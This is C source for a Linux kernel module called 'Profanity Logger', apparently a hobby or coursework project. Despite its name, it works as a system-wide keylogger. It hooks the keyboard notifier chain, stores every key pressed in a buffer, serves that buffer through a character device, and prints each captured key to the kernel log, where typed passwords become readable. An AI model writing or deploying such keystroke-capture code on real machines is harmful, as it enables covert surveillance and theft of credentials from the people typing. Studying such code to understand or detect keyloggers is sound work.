#include <linux/kernel.h>
#include <asm/uaccess.h>
#include "profanity-logger.h"

#define DEV_NAME "Profanity Logger"
#define TAG "[Profanity Logger]: " // Used for output

// To be used as the number given to the character device
int major;

static int __init pl_init(void) 
{
	printk (KERN_DEBUG TAG "Starting insert.\n");
	// 0 to allow the function to dynamically assign a major value
	// pl_fops contains the function pointers as a struct
  	major = register_chrdev(0, DEV_NAME, &pl_fops);
  
	// Failed registration
	if (major < 0)
	{
		// Return it as an error code, haulting init
		printk (KERN_DEBUG TAG "Failed to register.\n");
		return major;
	}

	printk(KERN_NOTICE TAG "Major number is %d", major);
	
	printk(KERN_DEBUG TAG "Registering keyboard notifier.\n");
	register_keyboard_notifier(&nb);
	// Set buffer to contain zeros as initialization
	memset(buffer, 0, sizeof(buffer));

	printk(KERN_DEBUG TAG "Inserting module.\n");

	return 0;
}

static void __exit pl_exit(void) 
{
	// Unregister the char device
	unregister_chrdev(major, DEV_NAME);
	// Unregister the keyboard notifier
	unregister_keyboard_notifier(&nb);

	// Have yet to find way to free pointer in kernel without free(*ptr)
	memset(buffer, 0, sizeof(buffer));
	buffPtr = buffer; 

	printk(KERN_DEBUG TAG "Removing module.\n");
}

// ********************************
// Begin overriding file operations
// ********************************

int pl_open(struct inode *inode, struct file *filp)
{
	printk(KERN_DEBUG TAG "Opening char device.\n");
	return 0;
}

ssize_t pl_read(struct file *filp, char __user *buf, size_t length, loff_t *offset)
{
	printk(KERN_DEBUG TAG "Reading device.\n");

	char* countPtr = buffer;
	int bytes = 0;

	// Because of memset's 0 initialization we check for anything
	// that isn't a 0 as a valid character and count it
	while (*countPtr != '\0') 
	{	
		++bytes;
		// Pointer arithmetic increments the index of the
		// buffer index
		++countPtr;
	}

	// If there were no characters read simply exit OR the offset
	// is not at the beginning of the file. Since the write is in one chunk,
	// the offset should be either 0 or it won't write. Without this the file
	// will have the same bytes written to it continiously
	if (bytes == 0 || *offset > 0)
		return 0;

	//int ret = copy_to_user(buf, buffer, bytes);

	// Otherwise copy bytes amount of bytes from buffer to buf (char* __user)
	// Used over put_user to do copy in one line instead of a loop
	if (copy_to_user(buf, buffer, bytes))
	{
		// Non-0 return is a failure (# of bytes not copied)
		printk(KERN_DEBUG TAG "Could not copy to buffer.\n");
		// Not entirely sure at this point what error could be
		// so return a negative error code defined in errno-base.h for IO error
		return -EIO;
	}
		
	// Set offset to the number of bytes written so infinite write is stopped
	*offset = bytes;

	printk(KERN_DEBUG TAG "Reading: ");
	debugPrint(bytes);

	return bytes;
}

// Used to print the buffer to dmesg
void debugPrint(int bytes)
{
	int i = 0;
	for (;i < bytes; ++i)
	{
		printk(KERN_DEBUG "%c", buffer[i]);
	}
}

int kbd_notifier(struct notifier_block* next, unsigned long action, void* data) 
{
	// Cast void* to keyboard_notifier_param 
	// This contains keyboard state info required
	struct keyboard_notifier_param *param = data;

	// KBD_KEYCODE is a hex definition for standard keyboard keycodes
	// param->down checks if the key in the notification is pressed
	if (action == KBD_KEYCODE && param->down) 
	{
		if (param->value == KEY_BACKSPACE)
		{
			printk(KERN_DEBUG TAG "Backspace caught.\n");
			// Deletes previous char
			if (buffPtr != buffer)
			{
				--buffPtr;
				*buffPtr = '\0';
			}
		}
		else		
		{
			char key;
			if (param->value == KEY_SPACE)
			{
				printk(KERN_DEBUG TAG "Caught a space.\n");
				key = ' ';
			}
                	else
			{
				key = getASCII(param->value);
				printk (KERN_DEBUG TAG "Reading value: %c", key);
			}

			if (key != UND_CHAR)
			{
				*buffPtr = key;
				buffPtr++;
				if (buffPtr == endPtr)	
					buffPtr = buffer;
			}
		}
	}

	return 1;
}

module_init(pl_init);
module_exit(pl_exit);

MODULE_LICENSE("GPL");

